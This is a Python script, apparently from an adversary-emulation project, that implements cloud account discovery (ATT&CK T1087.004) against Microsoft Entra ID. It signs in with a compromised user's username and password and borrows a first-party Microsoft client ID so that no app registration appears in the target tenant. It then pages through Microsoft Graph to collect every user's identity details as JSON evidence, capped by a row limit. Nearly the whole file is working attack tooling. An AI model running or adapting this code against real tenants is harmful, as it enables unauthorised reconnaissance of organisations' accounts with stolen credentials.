#!/usr/bin/env python3
"""
Rejewski Sprint 1 Tool 1 — list_users
ATT&CK T1087.004 Account Discovery: Cloud Account

Enumerates Entra ID users via Microsoft Graph GET /users using a delegated
token acquired by a non-admin compromised user. Borrows the Microsoft Graph
Command Line Tools first-party client (no tenant-side app registration is
created in the target tenant — see ADR 0001 §1, guardrail G-3, and the
phs_rejewski_no_tenant_app_reg auto-memory).

Reads creds from .env. Writes JSON evidence to stdout (default) or to a
file under .replay/ when --output is supplied. Honors guardrail G-9
enumeration row cap.

Required environment variables:
    AZURE_TENANT_ID            Target tenant ID (cloudharbordemo: 76b87c33-...)
    FOCI_CLIENT_ID             Borrowed first-party client (default: 14d82eec-...)
    COMPROMISED_USER_UPN       Seed user UPN (e.g. meganb@cloudharbor-demo.com)
    COMPROMISED_USER_PASSWORD  Seed user password
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from datetime import datetime, timezone
from typing import Any

import msal
import requests
from dotenv import load_dotenv

GRAPH_BASE = "https://graph.microsoft.com/v1.0"
GRAPH_SCOPE = ["https://graph.microsoft.com/.default"]
DEFAULT_SELECT = "id,displayName,userPrincipalName,mail,jobTitle,department,accountEnabled"
DEFAULT_TOP = 999            # Graph maximum page size for /users
DEFAULT_ROW_CAP = 1000       # G-9 default enumeration row cap
MAX_RETRIES = 3
USER_AGENT = "rejewski-tool-list-users/0.1 (+https://github.com/Cloud-Harbor-Consulting-LLC/rejewski)"
REQ_TIMEOUT = (5, 30)        # (connect, read) seconds


def acquire_token(
    tenant_id: str, client_id: str, upn: str, password: str
) -> tuple[msal.PublicClientApplication, dict[str, Any]]:
    app = msal.PublicClientApplication(
        client_id=client_id,
        authority=f"https://login.microsoftonline.com/{tenant_id}",
    )
    result = app.acquire_token_by_username_password(
        username=upn,
        password=password,
        scopes=GRAPH_SCOPE,
    )
    if "access_token" not in result:
        err = result.get("error", "unknown_error")
        desc = result.get("error_description", "no description")
        raise SystemExit(f"[auth] token acquisition failed: {err} — {desc}")
    return app, result


def refresh_token_silently(app: msal.PublicClientApplication) -> str:
    accounts = app.get_accounts()
    if not accounts:
        raise SystemExit("[auth] silent refresh failed: no cached account")
    result = app.acquire_token_silent(scopes=GRAPH_SCOPE, account=accounts[0])
    if not result or "access_token" not in result:
        raise SystemExit("[auth] silent refresh failed: no token returned")
    return result["access_token"]


def graph_get(
    url: str, token: str, app: msal.PublicClientApplication
) -> tuple[dict[str, Any], str]:
    """GET with Retry-After on 429/5xx (max 3) and one 401 silent-refresh recovery."""
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "User-Agent": USER_AGENT,
    }
    attempted_refresh = False
    for attempt in range(1, MAX_RETRIES + 1):
        resp = requests.get(url, headers=headers, timeout=REQ_TIMEOUT)
        if resp.status_code == 200:
            return resp.json(), token
        if resp.status_code == 401 and not attempted_refresh:
            token = refresh_token_silently(app)
            headers["Authorization"] = f"Bearer {token}"
            attempted_refresh = True
            continue
        if resp.status_code == 429 or 500 <= resp.status_code < 600:
            retry_after = int(resp.headers.get("Retry-After", "2"))
            if attempt < MAX_RETRIES:
                time.sleep(retry_after)
                continue
        raise SystemExit(f"[graph] {url} -> HTTP {resp.status_code}: {resp.text[:400]}")
    raise SystemExit(f"[graph] {url} -> exhausted {MAX_RETRIES} retries")


def list_users(
    token: str,
    app: msal.PublicClientApplication,
    select: str,
    page_size: int,
    row_cap: int,
) -> list[dict[str, Any]]:
    users: list[dict[str, Any]] = []
    url: str | None = f"{GRAPH_BASE}/users?$select={select}&$top={page_size}"
    while url and len(users) < row_cap:
        body, token = graph_get(url, token, app)
        page = body.get("value", [])
        remaining = row_cap - len(users)
        users.extend(page[:remaining])
        url = body.get("@odata.nextLink")
    return users


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Rejewski Tool 1 — T1087.004 Account Discovery (cloud)"
    )
    p.add_argument("--select", default=DEFAULT_SELECT, help="OData $select fields")
    p.add_argument(
        "--page-size", type=int, default=DEFAULT_TOP,
        help="$top page size (Graph maximum for /users is 999)",
    )
    p.add_argument(
        "--row-cap", type=int, default=DEFAULT_ROW_CAP,
        help="G-9 enumeration row cap",
    )
    p.add_argument(
        "--output",
        help="optional path to write JSON evidence (default: stdout)",
    )
    return p.parse_args()


def main() -> int:
    load_dotenv()
    tenant_id = os.environ["AZURE_TENANT_ID"]
    client_id = os.environ.get("FOCI_CLIENT_ID", "14d82eec-204b-4c2f-b7e8-296a70dab67e")
    upn = os.environ["COMPROMISED_USER_UPN"]
    password = os.environ["COMPROMISED_USER_PASSWORD"]

    args = parse_args()
    started_at = datetime.now(timezone.utc).isoformat()

    app, token_result = acquire_token(tenant_id, client_id, upn, password)
    users = list_users(
        token=token_result["access_token"],
        app=app,
        select=args.select,
        page_size=args.page_size,
        row_cap=args.row_cap,
    )

    evidence = {
        "tool": "tool_list_users",
        "technique": "T1087.004",
        "tenant_id": tenant_id,
        "borrowed_client_id": client_id,
        "actor_upn": upn,
        "started_at_utc": started_at,
        "completed_at_utc": datetime.now(timezone.utc).isoformat(),
        "select": args.select,
        "page_size": args.page_size,
        "row_cap": args.row_cap,
        "row_count": len(users),
        "row_cap_hit": len(users) >= args.row_cap,
        "users": users,
    }

    if args.output:
        os.makedirs(os.path.dirname(args.output) or ".", exist_ok=True)
        with open(args.output, "w", encoding="utf-8") as fh:
            json.dump(evidence, fh, indent=2)
    else:
        json.dump(evidence, sys.stdout, indent=2)
        sys.stdout.write("\n")
        sys.stdout.flush()
    return 0


if __name__ == "__main__":
    sys.exit(main())